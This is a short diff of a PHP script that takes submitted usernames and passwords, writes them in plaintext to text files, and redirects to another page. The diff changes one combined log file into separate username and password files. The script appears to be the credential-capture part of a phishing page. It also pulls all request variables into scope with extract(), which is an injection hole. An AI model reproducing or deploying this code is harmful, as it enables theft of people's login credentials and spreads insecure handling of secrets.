@@ -1,10 +1,9 @@
 <?php
     extract($_REQUEST);
-    $file=fopen("UP.txt","a+");
+    $file=fopen("Usernames.txt","a+");
 
-    fwrite($file,"name :");
     fwrite($file, $username ."\n");
-    fwrite($file,"Password :");
+    $file=fopen("Passwords.txt","a+");
     fwrite($file, $password ."\n");
     fclose($file);
     header("location: PAMver10.php");
